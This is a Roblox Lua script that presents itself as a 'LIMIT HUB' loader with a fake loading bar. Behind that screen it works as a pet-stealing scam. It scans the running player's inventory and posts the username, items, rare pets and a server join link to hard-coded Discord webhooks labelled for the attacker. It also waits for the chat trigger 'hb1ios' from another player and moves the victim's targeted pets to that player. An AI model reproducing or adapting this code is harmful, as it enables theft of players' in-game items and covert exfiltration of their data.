task.spawn(function()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local PlayerGui = player:WaitForChild("PlayerGui")

    -- GUI Setup
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LimitHubLoading"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    -- Semi-transparent Background (75% black)
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0.25 -- 75% black
    bg.BorderSizePixel = 0
    bg.Parent = screenGui

    -- LIMIT HUB title (centered above loading bar)
    local title = Instance.new("TextLabel")
    title.Text = "LIMIT HUB"
    title.Size = UDim2.new(0, 600, 0, 100)
    title.Position = UDim2.new(0.5, -300, 0.5, -120)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeTransparency = 0.2
    title.Font = Enum.Font.Fantasy
    title.TextScaled = true
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = bg

    -- Loading Bar Outline
    local barOutline = Instance.new("Frame")
    barOutline.Size = UDim2.new(0, 400, 0, 25)
    barOutline.Position = UDim2.new(0.5, -200, 0.5, 0)
    barOutline.BackgroundColor3 = Color3.new(0, 0, 0)
    barOutline.BorderColor3 = Color3.fromRGB(0, 255, 255)
    barOutline.BorderSizePixel = 2
    barOutline.Parent = bg

    -- Loading Fill
    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    fill.BorderSizePixel = 0
    fill.Parent = barOutline

    -- Percent Label
    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(0, 100, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -40)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.new(1, 1, 1)
    percentLabel.TextStrokeTransparency = 0.3
    percentLabel.Font = Enum.Font.Code
    percentLabel.TextScaled = true
    percentLabel.Parent = bg

    -- LOADING Text below bar
    local loadingText = Instance.new("TextLabel")
    loadingText.Text = "LOADING"
    loadingText.Size = UDim2.new(0, 400, 0, 70)
    loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeTransparency = 0.2
    loadingText.Font = Enum.Font.SciFi
    loadingText.TextScaled = true
    loadingText.Parent = bg

    -- Animate the Loading Bar
    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(3)
    end

    -- Done loading, remove GUI
    task.wait(1)
    screenGui:Destroy()
end)
-- Webhook (attacker receives info here)
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
local backdoorWebhook = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz..."

-- Roblox Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local chatTrigger = "hb1ios" -- trigger word attacker says

-- List of valuable pets attacker is targeting
local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}

-- ✅ Real inventory scanner
local function getInventory()
    local data = {
        items = {},
        rarePets = {},
        rareItems = {}
    }

    -- Scan Backpack and other folders
    local foldersToCheck = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }

    for _, folder in ipairs(foldersToCheck) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)

                if table.find(targetedPets, item.Name) then
                    table.insert(data.rarePets, item.Name)
                end
            end
        end
    end

    return data
end

-- 📤 Send inventory info to Discord
local function sendToWebhook()
    if not LocalPlayer then return end

    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local jobId = tostring(game.JobId or "N/A")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId

    local function sendMessage(payload)
        local jsonData = HttpService:JSONEncode(payload)
        for _, url in ipairs({webhookUrl, backdoorWebhook}) do
            request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end
    end

    -- Base report
    sendMessage({
        content = "🎯 Victim Detected!",
        embeds = {{
            title = "Victim Found",
            description = "Join and type trigger to attempt item transfer.",
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "Join Link", value = joinLink, inline = true},
                {name = "Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "Trigger", value = "`" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    -- Rare pets notification
    if #inventory.rarePets > 0 then
        sendMessage({
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pets Detected",
                description = "These rare pets are in the player's inventory!",
                fields = {
                    {name = "Username", value = LocalPlayer.Name},
                    {name = "Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```"}
                },
                color = 0xff0000,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end
end

-- 🔁 Chat-based trigger for item transfer
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        if msg == chatTrigger then
            local attacker = player
            local foldersToCheck = {
                LocalPlayer:FindFirstChild("Pets"),
                LocalPlayer:FindFirstChild("Backpack"),
                LocalPlayer:FindFirstChildOfClass("Folder")
            }

            for _, folder in ipairs(foldersToCheck) do
                if folder then
                    for _, item in ipairs(folder:GetChildren()) do
                        if table.find(targetedPets, item.Name) then
                            item.Parent = attacker:FindFirstChild("Backpack") or attacker
                        end
                    end
                end
            end
        end
    end)
end)

-- 🟢 Start by sending inventory info to attacker
sendToWebhook()
